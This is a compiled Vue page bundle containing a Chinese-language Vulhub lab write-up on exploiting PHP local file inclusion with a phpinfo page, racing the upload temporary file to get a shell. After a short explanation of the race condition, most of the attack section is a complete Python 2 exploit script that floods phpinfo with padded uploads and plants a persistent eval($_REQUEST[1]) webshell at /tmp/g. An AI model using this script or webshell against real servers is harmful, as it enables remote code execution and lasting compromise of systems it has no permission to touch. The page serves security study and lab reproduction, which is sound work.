import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"PHP 文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来 getshell。因为临时文件名是随机的，如果目标网站上存在 phpinfo，则可以通过 phpinfo 来获取临时文件名，进而进行包含。",-1),k=n("p",null,"参考链接：",-1),d={href:"https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf",target:"_blank",rel:"noopener noreferrer"},v=p(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>目标环境是 PHP7.2，说明该漏洞与 PHP 版本无关。</p><p>环境启动后，访问 <code>http://your-ip:8080/phpinfo.php</code> 即可看到一个 PHPINFO 页面，访问 <code>http://your-ip:8080/lfi.php?file=/etc/passwd</code>，可见的确存在文件包含漏洞。</p><h2 id="漏洞分析" tabindex="-1"><a class="header-anchor" href="#漏洞分析" aria-hidden="true">#</a> 漏洞分析</h2><p>在给 PHP 发送 POST 数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP 都会将这个文件保存成一个临时文件（通常是 <code>/tmp/php[6个随机字符]</code>），文件名可以在 <code>$_FILES</code> 变量中找到。这个临时文件，在请求结束后就会被删除。</p><p>同时，因为 phpinfo 页面会将当前请求上下文中所有变量都打印出来，所以我们如果向 phpinfo 页面发送包含文件区块的数据包，则即可在返回包里找到 <code>$_FILES</code> 变量的内容，自然也包含临时文件名。</p><p>在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。</p><p>但文件包含漏洞和 phpinfo 页面通常是两个页面，理论上我们需要先发送数据包给 phpinfo 页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行 getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p><p>这个时候就需要用到条件竞争，具体流程如下：</p><ol><li>发送包含了 webshell 的上传数据包给 phpinfo 页面，这个数据包的 header、get 等位置需要塞满垃圾数据；</li><li>因为 phpinfo 页面会将所有数据都打印出来，1 中的垃圾数据会将整个 phpinfo 页面撑得非常大；</li><li>php 默认的输出缓冲区大小为 4096，可以理解为 php 每次返回 4096 个字节给 socket 连接；</li><li>所以，我们直接操作原生 socket，每次读取 4096 个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包；</li><li>此时，第一个数据包的 socket 连接实际上还没结束，因为 php 还在继续每次输出 4096 个字节，所以临时文件此时还没有删除；</li><li>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终 getshell。</li></ol><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>利用脚本 <a href="exp.py">exp.py</a> 实现了上述过程，成功包含临时文件后，会执行 <code>&lt;?php file_put_contents(&#39;/tmp/g&#39;, &#39;&lt;?=eval($_REQUEST[1])?&gt;&#39;)?&gt;</code>，写入一个新的文件 <code>/tmp/g</code>，这个文件就会永久留在目标机器上。</p><p>用 python2 执行：<code>python exp.py your-ip 8080 100</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240529110408970.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，执行到第 118 个数据包的时候就写入成功。然后，利用 lfi.php，即可执行任意命令：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240529110559208.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞-poc" tabindex="-1"><a class="header-anchor" href="#漏洞-poc" aria-hidden="true">#</a> 漏洞 POC</h2>`,19),m={href:"http://exp.py",target:"_blank",rel:"noopener noreferrer"},b=p(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python </span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> socket

<span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    TAG<span class="token operator">=</span><span class="token string">&quot;Security Test&quot;</span>
    PAYLOAD<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;%s\\r
&lt;?php file_put_contents(&#39;/tmp/g&#39;, &#39;&lt;?=eval($_REQUEST[1])?&gt;&#39;)?&gt;\\r&quot;&quot;&quot;</span> <span class="token operator">%</span> TAG
    REQ1_DATA<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\\r
Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\\r
Content-Type: text/plain\\r
\\r
%s
-----------------------------7dbff1ded0714--\\r&quot;&quot;&quot;</span> <span class="token operator">%</span> PAYLOAD
    padding<span class="token operator">=</span><span class="token string">&quot;A&quot;</span> <span class="token operator">*</span> <span class="token number">5000</span>
    REQ1<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">&quot;&quot;&quot; HTTP/1.1\\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">&quot;&quot;&quot;\\r
HTTP_ACCEPT: &quot;&quot;&quot;</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;\\r
HTTP_USER_AGENT: &quot;&quot;&quot;</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">&quot;&quot;&quot;\\r
HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">&quot;&quot;&quot;\\r
HTTP_PRAGMA: &quot;&quot;&quot;</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">&quot;&quot;&quot;\\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r
Content-Length: %s\\r
Host: %s\\r
\\r
%s&quot;&quot;&quot;</span> <span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>REQ1_DATA<span class="token punctuation">)</span><span class="token punctuation">,</span>host<span class="token punctuation">,</span>REQ1_DATA<span class="token punctuation">)</span>
    <span class="token comment">#modify this to suit the LFI script   </span>
    LFIREQ<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\\r
User-Agent: Mozilla/4.0\\r
Proxy-Connection: Keep-Alive\\r
Host: %s\\r
\\r
\\r
&quot;&quot;&quot;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>REQ1<span class="token punctuation">,</span> TAG<span class="token punctuation">,</span> LFIREQ<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">phpInfoLFI</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> lfireq<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    s2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    

    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    s2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>

    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>
    d <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;</span> offset<span class="token punctuation">:</span>
        d <span class="token operator">+=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        i <span class="token operator">=</span> d<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">&quot;[tmp_name] =&amp;gt; &quot;</span><span class="token punctuation">)</span>
        fn <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">17</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">31</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>

    s2<span class="token punctuation">.</span>send<span class="token punctuation">(</span>lfireq <span class="token operator">%</span> <span class="token punctuation">(</span>fn<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token punctuation">)</span>
    d <span class="token operator">=</span> s2<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    s2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tag<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> fn

counter<span class="token operator">=</span><span class="token number">0</span>
<span class="token keyword">class</span> <span class="token class-name">ThreadWorker</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>event <span class="token operator">=</span> e
        self<span class="token punctuation">.</span>lock <span class="token operator">=</span>  l
        self<span class="token punctuation">.</span>maxattempts <span class="token operator">=</span> m
        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> counter
        <span class="token keyword">while</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">with</span> self<span class="token punctuation">.</span>lock<span class="token punctuation">:</span>
                <span class="token keyword">if</span> counter <span class="token operator">&gt;=</span> self<span class="token punctuation">.</span>maxattempts<span class="token punctuation">:</span>
                    <span class="token keyword">return</span>
                counter<span class="token operator">+=</span><span class="token number">1</span>

            <span class="token keyword">try</span><span class="token punctuation">:</span>
                x <span class="token operator">=</span> phpInfoLFI<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>
                <span class="token keyword">if</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">break</span>                
                <span class="token keyword">if</span> x<span class="token punctuation">:</span>
                    <span class="token keyword">print</span> <span class="token string">&quot;\\nGot it! Shell created in /tmp/g&quot;</span>
                    self<span class="token punctuation">.</span>event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    
            <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>
                <span class="token keyword">return</span>
    

<span class="token keyword">def</span> <span class="token function">getOffset</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span>
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>
    
    d <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        i <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
        d<span class="token operator">+=</span>i        
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        <span class="token comment"># detect the final chunk</span>
        <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">&quot;0\\r\\n\\r\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    i <span class="token operator">=</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;[tmp_name] =&amp;gt; &quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">&quot;No php tmp_name in phpinfo output&quot;</span><span class="token punctuation">)</span>
    
    <span class="token keyword">print</span> <span class="token string">&quot;found %s at %i&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>
    <span class="token comment"># padded up a bit</span>
    <span class="token keyword">return</span> i<span class="token operator">+</span><span class="token number">256</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    
    <span class="token keyword">print</span> <span class="token string">&quot;LFI With PHPInfo()&quot;</span>
    <span class="token keyword">print</span> <span class="token string">&quot;-=&quot;</span> <span class="token operator">*</span> <span class="token number">30</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">&quot;Usage: %s host [port] [threads]&quot;</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">&quot;Error with hostname %s: %s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    port<span class="token operator">=</span><span class="token number">80</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">&quot;Error with port %d: %s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    
    poolsz<span class="token operator">=</span><span class="token number">10</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        poolsz <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">&quot;Error with poolsz %d: %s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">&quot;Getting initial offset...&quot;</span><span class="token punctuation">,</span>  
    reqphp<span class="token punctuation">,</span> tag<span class="token punctuation">,</span> reqlfi <span class="token operator">=</span> setup<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
    offset <span class="token operator">=</span> getOffset<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    maxattempts <span class="token operator">=</span> <span class="token number">1000</span>
    e <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
    l <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">&quot;Spawning worker pool (%d)...&quot;</span> <span class="token operator">%</span> poolsz
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    tp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>poolsz<span class="token punctuation">)</span><span class="token punctuation">:</span>
        tp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ThreadWorker<span class="token punctuation">(</span>e<span class="token punctuation">,</span>l<span class="token punctuation">,</span>maxattempts<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> reqlfi<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>
        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            <span class="token keyword">with</span> l<span class="token punctuation">:</span>
                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">&quot;\\r% 4d / % 4d&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>counter<span class="token punctuation">,</span> maxattempts<span class="token punctuation">)</span><span class="token punctuation">)</span>
                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> counter <span class="token operator">&gt;=</span> maxattempts<span class="token punctuation">:</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">print</span>
        <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span> <span class="token string">&quot;Woot!  \\m/&quot;</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span> <span class="token string">&quot;:(&quot;</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">&quot;\\nTelling threads to shutdown...&quot;</span>
        e<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token keyword">print</span> <span class="token string">&quot;Shuttin&#39; down...&quot;</span>
    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>
        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function h(q,f){const a=o("ExternalLinkIcon");return c(),i("div",null,[u,r,k,n("ul",null,[n("li",null,[n("a",d,[s("https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf"),t(a)])])]),v,n("p",null,[n("a",m,[s("exp.py"),t(a)])]),b])}const w=e(l,[["render",h],["__file","PHP 利用 phpinfo 包含临时文件 getshell.html.vue"]]);export{w as default};
